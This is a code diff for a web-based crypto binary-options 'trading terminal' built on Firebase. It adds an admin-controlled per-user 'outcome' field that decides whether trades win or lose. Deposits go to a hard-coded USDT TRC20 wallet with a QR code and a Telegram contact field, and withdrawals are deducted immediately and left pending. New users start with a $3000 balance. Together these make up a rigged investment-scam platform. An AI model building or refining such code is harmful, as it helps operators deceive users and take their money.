@@ -24,15 +24,16 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
 
-        // Global Variables
         let currentUser = null;
         let userData = null;
+        let isTrading = false;
 
-        // --- AUTH FUNCTIONS ---
+        // --- Auth Functions ---
         window.executeAuth = async () => {
-            const email = document.getElementById('authEmail').value;
-            const pass = document.getElementById('authPass').value;
+            const email = document.getElementById('authEmail').value.trim();
+            const pass = document.getElementById('authPass').value.trim();
             const btn = document.getElementById('authSubmitBtn');
+            if(!email || !pass) return alert("Fill details");
             
             btn.innerText = "Processing...";
             try {
@@ -43,9 +44,8 @@
                         balance: 3000.00,
                         tid: Math.floor(100000 + Math.random() * 900000),
                         role: 'user',
-                        createdAt: new Date()
+                        outcome: 'random' // Can be 'win', 'loss', or 'random' controlled by admin
                     });
-                    alert("Account Created!");
                 } else {
                     await signInWithEmailAndPassword(auth, email, pass);
                 }
@@ -53,15 +53,12 @@
             btn.innerText = window.authMode === 'reg' ? "Create Account ➔" : "Log In ➔";
         };
 
-        window.logout = () => signOut(auth).then(() => location.reload());
-
-        // --- LISTEN FOR USER ---
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 currentUser = user;
                 onSnapshot(doc(db, "users", user.uid), (snap) => {
                     userData = snap.data();
-                    updateUI();
+                    syncUI();
                 });
                 document.getElementById('authWrapper').style.display = 'none';
                 document.getElementById('mainTerminal').style.display = 'flex';
@@ -72,29 +69,25 @@
             }
         });
 
-        function updateUI() {
+        window.logout = () => signOut(auth).then(() => location.reload());
+
+        function syncUI() {
             if(!userData) return;
             document.getElementById('balanceText').innerText = "$" + userData.balance.toFixed(2);
             document.getElementById('profileIco').innerText = userData.email[0].toUpperCase();
             document.getElementById('drawEmail').innerText = userData.email;
             document.getElementById('drawID').innerText = "TRADER ID: " + userData.tid;
             document.getElementById('drawIco').innerText = userData.email[0].toUpperCase();
-            
-            // Show Admin Link if role is admin
-            if(userData.role === 'admin') {
-                document.getElementById('adminLink').style.display = 'block';
-            }
+            if(userData.role === 'admin') document.getElementById('adminBtn').style.display = 'block';
         }
 
-        // --- TRADING LOGIC ---
+        // --- Trading Logic with Admin Control ---
         window.startTrade = async (type) => {
             const amt = parseFloat(document.getElementById('invAmount').value);
-            if(amt > userData.balance || amt <= 0) return alert("Insufficient Balance");
+            if(amt > userData.balance || isTrading || amt <= 0) return alert("Invalid Amount/Balance");
             
-            // Deduct Balance in Firebase
-            await updateDoc(doc(db, "users", currentUser.uid), {
-                balance: userData.balance - amt
-            });
+            isTrading = true;
+            await updateDoc(doc(db, "users", currentUser.uid), { balance: userData.balance - amt });
 
             let time = parseInt(document.getElementById('invTime').value);
             document.getElementById('tradeTimer').classList.remove('hidden');
@@ -105,15 +98,17 @@
                 if(time <= 0) {
                     clearInterval(itv);
                     document.getElementById('tradeTimer').classList.add('hidden');
-                    
-                    // Simple Logic: 50/50 Chance (Admin can force this later)
-                    const win = Math.random() > 0.5;
-                    const profit = amt * 1.85;
+                    isTrading = false;
 
+                    // Result logic: Use Admin set outcome or Random
+                    let win;
+                    if(userData.outcome === 'win') win = true;
+                    else if(userData.outcome === 'loss') win = false;
+                    else win = Math.random() > 0.5;
+
+                    const profit = amt * 1.82;
                     if(win) {
-                        await updateDoc(doc(db, "users", currentUser.uid), {
-                            balance: userData.balance + profit
-                        });
+                        await updateDoc(doc(db, "users", currentUser.uid), { balance: userData.balance + (amt + (amt*0.82)) });
                         showResultModal(true, profit);
                     } else {
                         showResultModal(false, amt);
@@ -122,21 +117,42 @@
             }, 1000);
         };
 
-        // --- DEPOSIT PROOF ---
+        // --- Deposit Logic ---
         window.finalDepSubmit = async () => {
             const txid = document.getElementById('dTx').value;
+            const tg = document.getElementById('dTg').value;
             if(!txid) return alert("Enter TXID");
             
             await addDoc(collection(db, "deposits"), {
                 uid: currentUser.uid,
                 email: userData.email,
-                amount: document.getElementById('dInp').value,
+                amount: parseFloat(document.getElementById('dInp').value),
                 txid: txid,
+                telegram: tg,
                 status: 'pending',
                 date: new Date()
             });
-            alert("Deposit submitted! Admin will verify soon.");
+            alert("Payment Proof Submitted!");
             closeModal('depModal');
+        };
+
+        // --- Withdraw Logic ---
+        window.executeWithdraw = async () => {
+            const amt = parseFloat(document.getElementById('wAmt').value);
+            const addr = document.getElementById('wAddr').value;
+            if(amt < 20 || amt > userData.balance) return alert("Invalid Amount");
+            
+            await addDoc(collection(db, "withdrawals"), {
+                uid: currentUser.uid,
+                email: userData.email,
+                amount: amt,
+                address: addr,
+                status: 'pending',
+                date: new Date()
+            });
+            await updateDoc(doc(db, "users", currentUser.uid), { balance: userData.balance - amt });
+            alert("Withdrawal Requested!");
+            closeModal('witModal');
         };
 
     </script>
@@ -215,7 +231,7 @@
                 <div class="bg-black/40 px-5 py-3 rounded-2xl border border-white/5">
                     <span class="text-[9px] text-gray-500 font-bold uppercase block mb-1">Time</span>
                     <select id="invTime" class="bg-transparent font-black text-sm text-white w-full">
-                        <option value="15">15 Sec</option><option value="60">1 Min</option>
+                        <option value="5">5 Sec</option><option value="15">15 Sec</option><option value="60">1 Min</option>
                     </select>
                 </div>
             </div>
@@ -240,16 +256,24 @@
             <button onclick="toStep2()" class="w-full py-4 bg-yellow-500 text-black font-black rounded-xl">PROCESS</button>
         </div>
         <div id="dStep2" class="hidden">
-            <p class="text-[10px] text-yellow-500 mb-4 font-bold uppercase">USDT TRC20</p>
+            <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM" class="mx-auto mb-4 bg-white p-2 rounded-xl">
             <div class="bg-black/50 p-3 rounded-xl border border-white/10 mb-4 cursor-pointer" onclick="copyWallet()">
                 <p class="text-[9px] text-white break-all">TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM</p>
             </div>
             <button onclick="toStep3()" class="w-full py-4 bg-green-600 text-white font-black rounded-xl uppercase text-xs">I Have Paid</button>
         </div>
         <div id="dStep3" class="hidden">
-            <div class="input-box"><label>TXID / Hash</label><input type="text" id="dTx" placeholder="Paste TXID"></div>
+            <div class="input-box"><label>Telegram ID</label><input type="text" id="dTg" placeholder="@user"></div>
+            <div class="input-box"><label>TXID</label><input type="text" id="dTx" placeholder="Paste TXID"></div>
             <button onclick="finalDepSubmit()" class="w-full py-4 bg-blue-600 text-white font-black rounded-xl">SUBMIT PROOF</button>
         </div>
+    </div></div>
+
+    <div id="witModal" class="ui-modal"><div class="auth-card">
+        <h3 class="text-white font-bold mb-6 text-center">Withdraw</h3>
+        <div class="input-box"><label>Wallet Address</label><input type="text" id="wAddr" placeholder="TRC20 Address"></div>
+        <div class="input-box"><label>Amount ($)</label><input type="number" id="wAmt" placeholder="Min $20"></div>
+        <button onclick="executeWithdraw()" class="w-full py-4 bg-white text-black font-black rounded-xl uppercase text-xs">Submit Request</button>
     </div></div>
 
     <div id="drawerOverlay" class="overlay" onclick="closeDrawer()"></div>
@@ -258,14 +282,13 @@
             <div id="drawIco" class="w-20 h-20 bg-yellow-500 rounded-3xl mx-auto flex items-center justify-center text-black text-3xl font-black mb-4">U</div>
             <p id="drawEmail" class="text-white font-bold"></p>
             <p id="drawID" class="text-yellow-500 text-[10px] mt-1 font-mono uppercase"></p>
-            <button id="adminLink" style="display:none" onclick="window.location.href='/admin.html'" class="w-full py-4 bg-yellow-500 text-black font-bold rounded-xl mt-4">ADMIN PANEL</button>
+            <button id="adminBtn" style="display:none" onclick="window.location.href='/admin.html'" class="w-full py-4 bg-yellow-500 text-black font-bold rounded-xl mt-4">ADMIN PANEL</button>
             <button onclick="logout()" class="w-full py-4 bg-red-500/20 text-red-500 font-bold rounded-xl mt-20">LOGOUT</button>
         </div>
     </div>
 
     <script src="https://s3.tradingview.com/tv.js"></script>
     <script>
-        // UI Helper Functions
         window.authMode = 'login';
         function setAuthMode(m) {
             window.authMode = m;
@@ -278,20 +301,17 @@
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
         function openDrawer() { document.getElementById('sideDrawer').classList.add('active'); document.getElementById('drawerOverlay').style.display = 'block'; }
         function closeDrawer() { document.getElementById('sideDrawer').classList.remove('active'); document.getElementById('drawerOverlay').style.display = 'none'; }
-        function toStep2() { document.getElementById('dStep1').classList.add('hidden'); document.getElementById('dStep2').classList.remove('hidden'); }
+        function toStep2() { if(document.getElementById('dInp').value >= 10) { document.getElementById('dStep1').classList.add('hidden'); document.getElementById('dStep2').classList.remove('hidden'); } }
         function toStep3() { document.getElementById('dStep2').classList.add('hidden'); document.getElementById('dStep3').classList.remove('hidden'); }
         function copyWallet() { navigator.clipboard.writeText("TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM"); alert("Copied!"); }
         function loadChart() { new TradingView.widget({ "autosize": true, "symbol": "BINANCE:BTCUSDT", "interval": "1", "theme": "dark", "container_id": "chartContainer", "hide_top_toolbar": true, "backgroundColor": "#0b0e14" }); }
         
         function showResultModal(win, val) {
             const m = document.getElementById('resModal');
-            const title = document.getElementById('resTitle');
-            const amtText = document.getElementById('resAmt');
-            const ico = document.getElementById('resIco');
-            title.innerText = win ? "PROFIT" : "LOSS";
-            title.style.color = win ? "#22c55e" : "#ef4444";
-            amtText.innerText = (win ? "+$" : "-$") + val.toFixed(2);
-            ico.innerText = win ? "🏆" : "❌";
+            document.getElementById('resTitle').innerText = win ? "PROFIT" : "LOSS";
+            document.getElementById('resTitle').style.color = win ? "#22c55e" : "#ef4444";
+            document.getElementById('resAmt').innerText = (win ? "+$" : "-$") + val.toFixed(2);
+            document.getElementById('resIco').innerText = win ? "🏆" : "❌";
             m.style.display = 'flex';
         }
     </script>
